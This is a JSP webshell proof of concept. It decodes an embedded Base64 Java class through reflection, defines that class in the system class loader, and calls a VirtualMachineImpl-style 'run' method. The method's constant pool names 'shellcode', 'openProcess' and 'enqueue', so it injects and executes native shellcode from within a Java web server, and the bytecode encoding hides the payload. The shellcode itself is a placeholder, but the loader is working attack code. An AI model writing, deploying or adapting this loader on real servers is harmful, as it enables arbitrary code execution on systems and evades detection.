<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Method" %>


<%!
public class Heigh {

    static {
        try {
            Class c = Class.forName(Thread.currentThread().getStackTrace()[1].getClassName());
            c.newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Heigh(){
        try {
            String code="yv66vgAAADEAJAoABwAYCAAZCgAaABsF//////////8IABwHAB0KAAkAHgcAHwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdlbnF1ZXVlAQA9KEpbQkxqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspVgEACkV4Y2VwdGlvbnMHACABAAtvcGVuUHJvY2VzcwEABChJKUoBAANydW4BAAUoW0IpVgEAClNvdXJjZUZpbGUBABdWaXJ0dWFsTWFjaGluZUltcGwuamF2YQwACgALAQAGYXR0YWNoBwAhDAAiACMBAAlzaGVsbGNvZGUBABBqYXZhL2xhbmcvT2JqZWN0DAAOAA8BACNzdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lSW1wbAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAJAAcAAAAAAAQAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAAFAYgADgAPAAEAEAAAAAQAAQARAQgAEgATAAEAEAAAAAQAAQARAAkAFAAVAAIADAAAADUABgABAAAAFRICuAADFAAEKhIGEgYDvQAHuAAIsQAAAAEADQAAAA4AAwAAAAsABQAOABQADwAQAAAABAABABEAAQAWAAAAAgAX";
            String code1="AAAAAAAAA";
            Class base64=Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            byte[] classBytes = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{code});
            byte[] bytes1 = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{code1});
            Method m = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            m.setAccessible(true);
            Class c = (Class) m.invoke(ClassLoader.getSystemClassLoader(), classBytes, 0, classBytes.length);
            Method run = c.getDeclaredMethod("run", byte[].class);
            run.invoke(null, bytes1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {

    }
}
%>
<html>
<head>
    <title>$Title$</title>
</head>
<body>
$END$
<% Poc.main(null); %>
</body>
</html>
